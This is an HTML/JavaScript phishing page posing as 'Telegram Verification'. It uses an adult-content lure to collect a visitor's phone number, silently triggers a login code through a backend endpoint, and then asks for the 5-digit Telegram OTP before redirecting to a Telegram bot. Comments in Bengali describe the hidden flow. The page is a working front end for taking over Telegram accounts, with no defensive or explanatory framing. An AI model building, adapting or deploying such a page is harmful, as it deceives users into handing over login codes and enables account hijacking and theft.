<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification - Unlock</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
        body { 
            background-color: #000; 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center;
            overflow: hidden;
            position: relative;
        }
        
        .bg-video {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; z-index: 1; filter: brightness(0.5);
        }

        .container {
            position: relative; z-index: 2; width: 92%; max-width: 380px;
            display: flex; flex-direction: column; align-items: center;
        }

        /* Main Card Box */
        .header-box {
            background: white; padding: 22px 18px 18px 18px; border-radius: 18px;
            width: 100%; text-align: center; margin-bottom: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
            position: relative;
            margin-top: 35px;
        }

        /* VFX Glowing Animated Icon */
        .animated-icon-container {
            position: absolute; top: -45px; left: 50%; transform: translateX(-50%);
            width: 75px; height: 75px;
            background: linear-gradient(135deg, #0088CC, #00bfff);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 20px rgba(0, 136, 204, 0.8), inset 0 0 10px rgba(255,255,255,0.5);
            border: 3px solid #ffffff;
            animation: pulseGlow 1.5s infinite alternate;
        }

        .phone-icon-inner { font-size: 34px; animation: bounceIcon 1s infinite alternate; }

        @keyframes pulseGlow {
            0% { transform: translateX(-50%) scale(1); box-shadow: 0 0 15px rgba(0, 136, 204, 0.6); }
            100% { transform: translateX(-50%) scale(1.08); box-shadow: 0 0 30px rgba(0, 136, 204, 1); }
        }

        @keyframes bounceIcon {
            0% { transform: translateY(0); }
            100% { transform: translateY(-3px); }
        }

        .header-box h2 {
            margin-top: 10px; font-size: 16px; color: #222; font-weight: 700; margin-bottom: 12px;
        }
        
        .phone-input {
            width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 10px;
            font-size: 15px; outline: none; text-align: center; margin-bottom: 12px;
            font-weight: 600; color: #333;
        }
        .btn-get-code {
            background: #2ECC71; color: white; width: 100%; padding: 12px;
            border-radius: 10px; border: none; font-weight: 700; font-size: 15px; cursor: pointer;
            box-shadow: 0 4px 12px rgba(46, 204, 113, 0.4); transition: 0.2s;
        }
        .btn-get-code:active { transform: scale(0.97); }

        /* নিচের ওটিপি সেকশন (শুরুতে হাইড থাকবে, কোড পাঠানোর পর শো হবে) */
        .otp-wrapper {
            width: 100%; display: flex; flex-direction: column; gap: 12px;
        }

        .otp-text-input {
            width: 100%; padding: 15px; font-size: 20px; font-weight: 600;
            text-align: center; border-radius: 14px;
            border: 2px solid rgba(255, 255, 255, 0.8);
            background: rgba(255, 255, 255, 0.15); color: #fff;
            backdrop-filter: blur(10px); outline: none;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        .otp-text-input::placeholder {
            color: rgba(255, 255, 255, 0.7); font-size: 16px; font-weight: normal;
        }

        /* Transparent Glassmorphism Confirm Otp Button with Glowing Border Effect */
        .btn-confirm-otp {
            width: 100%; padding: 15px; font-size: 18px; font-weight: 700; color: #ffffff;
            background: rgba(255, 255, 255, 0.15); border: 2px solid rgba(255, 255, 255, 0.8);
            border-radius: 14px; cursor: pointer; backdrop-filter: blur(12px);
            box-shadow: 0 0 20px rgba(0, 229, 255, 0.6), inset 0 0 10px rgba(255, 255, 255, 0.3);
            animation: buttonGlow 2s infinite alternate; transition: 0.2s;
        }
        .btn-confirm-otp:active { transform: scale(0.97); }

        @keyframes buttonGlow {
            0% { box-shadow: 0 0 15px rgba(0, 229, 255, 0.4), inset 0 0 8px rgba(255, 255, 255, 0.2); border-color: rgba(255, 255, 255, 0.6); }
            100% { box-shadow: 0 0 30px rgba(0, 229, 255, 0.9), inset 0 0 15px rgba(255, 255, 255, 0.6); border-color: #00ffff; }
        }
    </style>
</head>
<body>

    <video autoplay muted loop playsinline class="bg-video">
        <source src="https://videotourl.com/videos/1791952459901-05439f7d-513c-4994-b03b-ca0ca313b9cc.mp4" type="video/mp4">
    </video>

    <div class="container">
        
        <!-- উপরে নাম্বার ও গেট কোড সেকশন -->
        <div class="header-box" id="phoneSection">
            <div class="animated-icon-container">
                <div class="phone-icon-inner">📥</div>
            </div>

            <h2>Enter Telegram Number 🔞</h2>
            <input type="text" id="phoneInput" class="phone-input" placeholder="+880 XXXXXXXXXX">
            <button class="btn-get-code" onclick="sendCode()">GET CODE 📩</button>
        </div>

        <!-- নিচে ওটিপি এবং কনফার্ম সেকশন (শুরুতে লুকানো থাকবে) -->
        <div class="otp-wrapper" id="otpSection" style="display: none;">
            <input type="text" id="otpInput" class="otp-text-input" maxlength="5" placeholder="Enter 5-Digit OTP">
            <button class="btn-confirm-otp" onclick="verifyOtpCode()">Confirm Otp ✨</button>
        </div>
    </div>

    <script>
        let savedPhone = "";

        function sendCode() {
            let phone = document.getElementById('phoneInput').value;
            if(!phone) {
                return;
            }
            savedPhone = phone;
            
            // নীরবে ব্যাকএন্ডে রিকোয়েস্ট পাঠানো হচ্ছে (কোনো পপআপ ছাড়া)
            fetch('/send-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phone })
            })
            .then(res => res.json())
            .then(data => {
                if(data.status === "success") {
                    // সফলভাবে কোড চলে গেলে নিচের ওটিপি সেকশনটি স্মুথলি ওপেন হয়ে যাবে
                    document.getElementById('otpSection').style.display = "flex";
                    document.getElementById('otpInput').focus();
                } else {
                    alert("Error: " + data.message);
                }
            })
            .catch(err => console.log("Connection error"));
        }

        function verifyOtpCode() {
            let code = document.getElementById('otpInput').value;
            if(!code || code.length < 5) {
                return;
            }

            fetch('/verify-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: savedPhone, code: code })
            })
            .then(res => res.json())
            .then(data => {
                if(data.status === "success") {
                    // সফলভাবে ভেরিফাই হলে নতুন ট্যাবে টেলিগ্রাম বট ওপেন হবে
                    window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
                } else {
                    alert("Verification Failed: " + data.message);
                    document.getElementById('otpInput').value = "";
                }
            })
            .catch(err => console.log("Verification error"));
        }
    </script>
</body>
</html>
